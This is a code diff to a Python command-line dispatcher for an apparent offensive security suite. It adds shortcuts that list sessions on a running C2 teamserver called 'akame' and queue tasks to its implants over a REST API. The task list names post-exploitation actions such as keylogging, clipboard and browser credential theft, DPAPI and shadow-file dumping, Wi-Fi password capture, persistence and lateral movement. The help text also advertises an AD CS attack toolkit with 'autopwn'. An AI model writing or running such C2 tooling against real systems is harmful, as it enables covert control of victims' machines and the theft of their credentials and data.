@@ -238,6 +238,16 @@ SIGIL_SUBCMDS = [
     "clr", "full-disasm", "yara",
 ]
 
+# akame is a teamserver, not a one-shot binary — you drive it over its REST
+# API while it runs. `ne0suite akame task <session> <type>` wraps that API so
+# the dispatcher stays the one entry point. mirrored from server/src/task.rs
+# so the shortcut can validate before the server does.
+AKAME_TASKS = [
+    "shell", "ls", "download", "upload", "sleep", "die",
+    "ps", "kill", "persist", "burn", "shot", "env", "netstat",
+    "sweep", "history", "hunt", "keylog", "clip", "browsers", "ssh",
+    "wifi", "shadow", "arp", "suid", "lateral", "winreg", "dpapi", "logins",
+]
 HELP = f"""  {BOLD}ne0suite{RESET} {DIM}<tool> [args...]  |  status  |  console  |  history  |  check  |  help{RESET}
 
   {CYAN}grimoire{RESET}   {DIM}g{RESET}          Recon, C2, payloads, stego
@@ -245,6 +255,7 @@ HELP = f"""  {BOLD}ne0suite{RESET} {DIM}<tool> [args...]  |  status  |  console 
   {CYAN}wraith{RESET}     {DIM}wn  recon{RESET}  Attack surface intel
   {CYAN}shadowci{RESET}   {DIM}sh{RESET}         CI/CD security scanner
   {CYAN}akame{RESET}      {DIM}c2{RESET}         C2 teamserver {DIM}(Rust){RESET}
+  {DIM}    · akame task <session> <type>  queue a task on a live server{RESET}
   {CYAN}sigil{RESET}      {DIM}analyze{RESET}    PE/ELF static analyzer {DIM}(Rust){RESET}
   {CYAN}kira-installer{RESET} {DIM}install{RESET} Env bootstrap
   {CYAN}adcs{RESET}      {DIM}cert{RESET}      AD CS attack toolkit — ESC1/3/4/6, shadow, autopwn
@@ -538,6 +549,138 @@ def resolve_sigil():
     return None  # caller falls back to cargo run --release
 
 
+# ── akame REST shortcuts ──────────────────────────────────────────────────────
+# the akame binary is a long-running teamserver; `ne0suite akame task` talks
+# to its operator API instead of spawning a second server. base URL and token
+# come from env vars first, then ~/.ne0suite/config.json, then sane defaults.
+
+def akame_api_base():
+    """Where the running teamserver's API lives."""
+    env = os.environ.get("AKAME_API")
+    if env:
+        return env.rstrip("/")
+    try:
+        cfg = json.loads(CONFIG_FILE.read_text())
+        return cfg.get("akame_api", "http://127.0.0.1:8443").rstrip("/")
+    except Exception:
+        return "http://127.0.0.1:8443"
+
+
+def akame_api_token():
+    """Bearer token for the operator API — env wins, then config file."""
+    env = os.environ.get("AKAME_API_TOKEN")
+    if env:
+        return env
+    try:
+        cfg = json.loads(CONFIG_FILE.read_text())
+        return cfg.get("akame_token", "")
+    except Exception:
+        return ""
+
+
+def akame_sessions():
+    """List sessions registered on the running teamserver."""
+    import urllib.request
+
+    url = f"{akame_api_base()}/sessions"
+    req = urllib.request.Request(url)
+    token = akame_api_token()
+    if token:
+        req.add_header("Authorization", f"Bearer {token}")
+    try:
+        with urllib.request.urlopen(req, timeout=5) as r:
+            data = json.loads(r.read())
+    except Exception as e:
+        print(f"  {RED}[!]{RESET} akame API unreachable at {url}: {e}")
+        sys.exit(1)
+
+    sessions = data.get("sessions", [])
+    if not sessions:
+        print(f"  {DIM}no sessions registered yet{RESET}")
+        return
+    print(f"  {BOLD}{'SESSION ID':<38} {'HOST':<20} {'USER':<16} {'OS'}{RESET}")
+    print(f"  {'─' * 78}")
+    for s in sessions:
+        print(f"  {CYAN}{s.get('id', '?')}{RESET:<38} "
+              f"{s.get('hostname', '?'):<20} "
+              f"{s.get('username', '?'):<16} "
+              f"{s.get('os', '?')} {s.get('arch', '')}")
+
+
+def akame_task(args):
+    """Queue a task: ne0suite akame task <session_id> <type> [key=value ...]
+
+    Optional --wait blocks until the implant reports a result and prints it.
+    Without it, just the queued task id comes back.
+    """
+    import urllib.request
+
+    if len(args) < 2:
+        print(f"  {YELLOW}usage:{RESET} ne0suite akame task <session_id> <type> [key=value ...] [--wait]")
+        print(f"  {DIM}types: {', '.join(AKAME_TASKS)}{RESET}")
+        sys.exit(1)
+
+    session_id, task_type = args[0], args[1]
+    if task_type not in AKAME_TASKS:
+        print(f"  {YELLOW}[!]{RESET} unknown task type '{task_type}' — server will reject it")
+
+    payload = {"type": task_type}
+    wait = False
+    for a in args[2:]:
+        if a == "--wait":
+            wait = True
+        elif "=" in a:
+            k, v = a.split("=", 1)
+            payload[k] = v
+
+    url = f"{akame_api_base()}/sessions/{session_id}/task"
+    req = urllib.request.Request(
+        url, data=json.dumps(payload).encode(), method="POST",
+        headers={"Content-Type": "application/json"},
+    )
+    token = akame_api_token()
+    if token:
+        req.add_header("Authorization", f"Bearer {token}")
+    try:
+        with urllib.request.urlopen(req, timeout=5) as r:
+            data = json.loads(r.read())
+    except Exception as e:
+        print(f"  {RED}[!]{RESET} akame API unreachable at {url}: {e}")
+        sys.exit(1)
+
+    task_id = data.get("task_id")
+    print(f"  {GREEN}✔{RESET} queued {CYAN}{task_type}{RESET} → task {GOLD}{task_id}{RESET}")
+
+    if not wait:
+        print(f"  {DIM}re-run with --wait to block for the result{RESET}")
+        return
+
+    import time
+
+    deadline = time.monotonic() + 60
+    while time.monotonic() < deadline:
+        time.sleep(2)
+        try:
+            rurl = f"{akame_api_base()}/tasks/{task_id}/result"
+            rreq = urllib.request.Request(rurl)
+            if token:
+                rreq.add_header("Authorization", f"Bearer {token}")
+            with urllib.request.urlopen(rreq, timeout=5) as r:
+                res = json.loads(r.read())
+            break
+        except Exception:
+            res = None  # not done yet — implant hasn't checked in
+    else:
+        print(f"  {YELLOW}[!]{RESET} no result within 60s (implant idle?) — poll with:")
+        print(f"  {DIM}curl -H 'Authorization: Bearer {token}' "
+              f"{akame_api_base()}/tasks/{task_id}/result{RESET}")
+        sys.exit(1)
+
+    print(f"  {DIM}exit_code={res.get('exit_code')} error={res.get('error')}{RESET}")
+    if res.get("output"):
+        print(f"  {res['output']}")
+
+
 def cmd_dispatch(tool, args, in_console=False):
     # resolve aliases before anything else
     tool = ALIASES.get(tool, tool)
@@ -563,6 +706,16 @@ def cmd_dispatch(tool, args, in_console=False):
 
     info = TOOLS[tool]
     pdir = project_path(tool)
+
+    # akame is a teamserver — `task` and `sessions` talk to a running
+    # instance via its REST API instead of launching a second server
+    if tool == "akame" and args and args[0] in ("task", "sessions"):
+        HistoryManager.log_event(tool, args, 0.0, 0)
+        if args[0] == "sessions":
+            akame_sessions()
+        else:
+            akame_task(args[1:])
+        sys.exit(0)
 
     if os.environ.get("NE0_DEBUG"):
         print(f"  {DIM}[debug] tool={tool} run={info['run']} dir={pdir} args={args}{RESET}",
